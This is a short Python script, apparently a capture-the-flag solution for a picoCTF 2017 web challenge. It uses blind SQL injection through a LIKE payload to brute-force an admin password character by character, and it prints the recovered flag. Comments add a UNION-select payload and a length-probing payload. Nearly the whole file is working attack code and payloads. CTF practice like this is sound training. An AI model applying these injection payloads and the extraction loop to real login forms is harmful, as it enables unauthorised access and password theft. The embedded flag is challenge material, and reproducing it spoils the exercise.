'''
How the code works
Bruteforce each letter of the password by passing 
	' or pass LIKE 'startswith%';--
into the password field
	admin
into the user field

replace startswith% with the result of each iteration
'''
# Final flag: NOT_ALL_ERRORS_SHOULD_BE_SHOWN_FAA8380E951439EEBB3D452B5E86F3F9


import requests

#CHAR_LIST = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567890!@#$^&*()+{}|[]_%"
CHAR_LIST = "_ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$^&*()+{}|[]%"

text = ""

while len(text) < 63: # loop until we bruteforce all letters
	print "progress =", len(text), "| ", text
	for ch in CHAR_LIST:
		guess = text + ch
		guess = guess.replace("%", "\%").replace("_", "\_") 
		# % and _ are used as wildcards in SQLite, hence, we need to escape it
		r = requests.post("http://shell2017.picoctf.com:40788/", 
			data= {
				'username': "admin",
				'password': "' or pass LIKE '" + guess + "%' ESCAPE '\\';--"
			}
		)
		# print(r.text)
		#print(r.status_code, r.reason) #200 OK
		if 'Login Functionality Not Complete. Flag is 63 characters' in r.text:
			print "success ->", ch
			text += ch
			break
		elif 'Incorrect Password.' in r.text:
			print "failed ->", ch
			#print "."
		else:
			print "ERROR Should not be here?!" 

print "FINAL: ", text
		
'''
	' or ''='' union select pass, user from users; --
	' or (user='admin' and length(pass)=63);--
'''